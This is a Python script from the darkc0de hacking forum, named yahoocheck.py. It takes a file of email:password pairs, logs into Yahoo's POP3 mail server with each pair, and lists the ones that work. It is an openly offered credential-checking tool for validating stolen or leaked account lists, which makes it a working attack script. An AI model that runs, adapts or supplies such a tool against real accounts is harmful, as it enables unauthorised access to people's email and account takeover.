#!/usr/bin/python 
# 
#                                                              # 
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#    You only get smarter, by playing a smarter opponent!      # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
#                                                              # 
# 
#code: p47r1ck 
#name: yahoocheck.py 
#version 1.0 
# 
#IMPORTANT!!! 
#THIS SCANNER IS WORKING ONLY FOR YAHOO ACCOUNTS THAT HAVE THE POP ENABLED. 
#    "You only get smarter 
#          by playing a smarter opponent!" 
#                by P47r1ck 
 
import sys, poplib 
 
def printHelp(): 
    print '\nUsage: ./yahoocheck.py <emails>' 
    print 'Ex:    ./yahoocheck.py emails.txt' 
    print '\nNote: The accounts must be in the following format: user@yahoo.com:password\n' 
 
print "\n********************************************************************" 
print "*Y    Y    A     H	H     000       000   Yahoo Email Checker! *" 
print "* Y  Y    A A	 H	H    0   0     0   0  Version 1.0          *" 
print "*  YY    A   A	 HHHHHHHH   0     0   0     0 Coded by P47r1ck!    *" 
print "*  YY   AAAAAAA	 H	H    0   0     0   0  www.darkc0de.com     *" 
print "*  YY  A       A H      H     000       000   06/2009              *" 
print "********************************************************************" 
 
if len(sys.argv) != 2: 
    printHelp() 
    exit(1) 
 
#Change these if needed. 
HOST = 'plus.pop.mail.yahoo.com' 
PORT = 995 
 
# Do not change anything below. 
maillist = sys.argv[1] 
valid = [] 
currline = 0 
 
try: 
    handle = open(maillist) 
except: 
    print '\n[-] Could not open the accounts file. Check the file path and try again.' 
    print '\n[-] Quitting ...' 
    exit(1) 
 
for line in handle: 
    currline += 1 
 
    try: 
        email = line.split(':')[0] 
        password = line.split(':')[1].replace('\n', '') 
    except: 
        print '\n[-] Erroneous account format at line %d.' % currline 
        print '[!] Accounts must be in the following format: user@yahoo.com:password' 
        print '\n[-] Quitting ...' 
        exit(1) 
 
    try: 
        pop = poplib.POP3_SSL(HOST, PORT) 
        pop.user(email) 
        pop.pass_(password) 
        valid.append(email + ':' + password) 
        print '\n[+] Checking: %s <%s> -> Valid!\n' % (email, password) 
        pop.quit() 
    except: 
        print '[+] Checking: %s <%s> -> Invalid!' % (email, password) 
        pass 
 
print '\n[+] Total Valid: %s' % len(valid) 
print '\n[+] Done.\n'
